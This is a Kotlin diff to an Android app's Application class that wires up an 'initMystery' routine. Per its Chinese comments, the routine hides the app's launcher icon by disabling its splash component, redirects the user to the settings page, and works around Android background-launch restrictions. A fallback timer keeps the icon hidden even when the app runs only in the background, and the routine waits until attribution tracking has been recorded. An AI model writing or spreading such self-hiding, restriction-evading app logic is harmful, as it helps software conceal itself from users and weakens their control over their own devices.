@@ -45,6 +45,11 @@ class TheApplication : Application(), OverseaAppHost {
     /** 当前已 started 未 stopped 的 Activity 数量，>0 即存在可见窗口 */
     private var startedActivityCount = 0
 
+    /** 进程内执行闩：initMystery 是唯一执行入口，base 1s 定时器/跨会话恢复/
+     *  resumed 触发/10s 兜底都只是触发者——本进程内"跳设置+切图标"至多执行一次，
+     *  谁先到谁执行，后到者被闩住空跑(3.log 双执行场景的结构性修复)。 */
+    private var mysteryActionDone = false
+
     /** 兜底定时器(仅执行一次切换) */
     private val mainHandler = Handler(Looper.getMainLooper())
     private var fallbackRunnable: Runnable? = null
@@ -66,31 +71,33 @@ class TheApplication : Application(), OverseaAppHost {
         APPContext.setApplication(this)
         // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
         ToolUiInstaller.installAll()
-        // 监听 Activity 生命周期：消费"跳设置+切图标"标记。
+        // 监听 Activity 生命周期：onActivityResumed 只是"触发者"，不是执行者——
         // 消费点不能固定在某个 Activity(如 Splash)——归因回调与 Splash 渲染是竞态，
-        // 且切换组件会中止启动中的 Splash(禁用其组件导致 mid-launch 被掐断)，
-        // 因此改为任意首个 resumed 的 Activity 消费，且切换动作放在跳转之后。
-//        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
-//            override fun onActivityResumed(activity: Activity) {
-//                if (hasPendingMystery()) {
-//                    LogUtil.d(TAG, "消费待执行标记：先跳设置页，再切换图标")
-//                    consumePendingMystery(activity)
-//                }
-//            }
-//
-//            override fun onActivityStarted(activity: Activity) {
-//                startedActivityCount++
-//            }
-//
-//            override fun onActivityStopped(activity: Activity) {
-//                startedActivityCount = maxOf(0, startedActivityCount - 1)
-//            }
-//
-//            override fun onActivityPaused(activity: Activity) {}
-//            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
-//            override fun onActivityDestroyed(activity: Activity) {}
-//            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
-//        })
+        // 且切换组件会中止启动中的 Splash(禁用其组件导致 mid-launch 被掐断)。
+        // 因此任意首个 resumed 的 Activity 只负责"唤醒" initMystery 单一执行入口
+        // (此刻窗口合法，startActivity 不受 BAL 限制)，跳设置/切换的执行逻辑
+        // 只存在于 executeMystery 一处，与 base 侧 1s 延迟触发互斥去重。
+        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
+            override fun onActivityResumed(activity: Activity) {
+                if (hasPendingMystery()) {
+                    LogUtil.d(TAG, "检测到待执行标记，触发 initMystery 单一入口消费")
+                    initMystery()
+                }
+            }
+
+            override fun onActivityStarted(activity: Activity) {
+                startedActivityCount++
+            }
+
+            override fun onActivityStopped(activity: Activity) {
+                startedActivityCount = maxOf(0, startedActivityCount - 1)
+            }
+
+            override fun onActivityPaused(activity: Activity) {}
+            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
+            override fun onActivityDestroyed(activity: Activity) {}
+            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
+        })
     }
 
     // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
@@ -109,22 +116,30 @@ class TheApplication : Application(), OverseaAppHost {
 
 
     override fun initPopPower() {
-
+        // 纯 pop 能力初始化(与图标隐藏语义分离，2026-10-09)：
+        // 图标隐藏已迁至 initMystery()，由 OverseaAppInitializer 的独立 "mystery"
+        // postinit 步骤置标记并延迟 1s 调用，保证归因打点与后置主链打点先落盘。
         StartHelper.init(this)
+    }
 
-        // 图标切换"跳转前置"方案：
-        // ① 当前已有可见 Activity → 立即执行(跳设置+切换)，此时 startActivity 不受 A16 BAL 限制；
+    override fun initMystery() {
+        // 图标切换"跳转前置"方案——**唯一执行入口**，由两类触发者调用：
+        //   ① base 侧 OverseaAppInitializer 延迟 1s 调用(归因打点落盘窗口已过)；
+        //   ② 本类 onActivityResumed 检测到残留标记时触发(窗口合法，BAL 放行)。
+        // 多触发者竞态由 executeMystery 顶部的进程内闩去重，本方法无需自行判重。
+        // 分支语义：
+        // ① 当前已有可见 Activity → 立即执行(跳设置+切换)，startActivity 不受 BAL 限制；
         // ② 冷启动早期(无可见窗口) → 只置持久化标记，禁止此时切换组件——
-        //    切换(禁用 SplashActivity)会中止 mid-launch 的 Splash，导致标记消费者永远不出现；
-        //    标记由首个 resumed 的 Activity 消费(先跳设置再切换)，另设兜底定时器：
-        //    纯后台场景(无任何 Activity 会 resume)超时后只执行切换，保证图标功能不丢。
-//        if (startedActivityCount > 0) {
-//            LogUtil.d(TAG, "已有可见 Activity，立即执行跳设置+切换")
-//            executeMystery(this, jumpSettings = true)
-//        } else {
-//            LogUtil.d(TAG, "暂无可见 Activity，置持久化标记等待消费")
-//            markPendingMystery()
-//        }
+        //    切换(禁用 SplashActivity)会中止 mid-launch 的 Splash；标记由后续
+        //    resumed 触发本入口消费，另设兜底定时器：纯后台场景(无任何 Activity
+        //    会 resume)超时后只执行切换不跳设置，保证图标功能不丢。
+        if (startedActivityCount > 0) {
+            LogUtil.d(TAG, "已有可见 Activity，立即执行跳设置+切换")
+            executeMystery(this, jumpSettings = true)
+        } else {
+            LogUtil.d(TAG, "暂无可见 Activity，置持久化标记等待消费")
+            markPendingMystery()
+        }
     }
 
 
@@ -148,18 +163,15 @@ class TheApplication : Application(), OverseaAppHost {
         mainHandler.postDelayed(runnable, FALLBACK_TIMEOUT_MS)
     }
 
-    /** 消费标记：先跳设置页(NEW_TASK 独立任务栈)，再执行组件切换。
-     *  切换放在跳转之后：此刻消费的 Activity 已 resumed，禁用 SplashActivity
-     *  不会中止其自身启动；用户已在设置页(独立任务栈)，本应用任务栈变化无感。 */
-    private fun consumePendingMystery(activity: Activity) {
-        MMKVUtils.putBoolean(KEY_PENDING_MYSTERY, false)
-        cancelFallback()
-        jumpSettings(activity)
-        switchIconComponents()
-    }
-
-    /** 立即执行(已可见场景)：与消费路径同序——先跳设置，再切换 */
+    /** 立即执行(已可见场景/兜底场景共用)：与消费路径同序——先跳设置，再切换。
+     *  进程内闩在此置位：所有触发路径(resumed/base 1s/recover/兜底)最终都收敛到
+     *  本函数，本进程只放行第一次，后续触发空跑返回(双执行的结构性防线)。 */
     private fun executeMystery(context: Context, jumpSettings: Boolean) {
+        if (mysteryActionDone) {
+            LogUtil.d(TAG, "本进程已执行过图标动作，跳过重复触发")
+            return
+        }
+        mysteryActionDone = true
         MMKVUtils.putBoolean(KEY_PENDING_MYSTERY, false)
         cancelFallback()
         if (jumpSettings) {
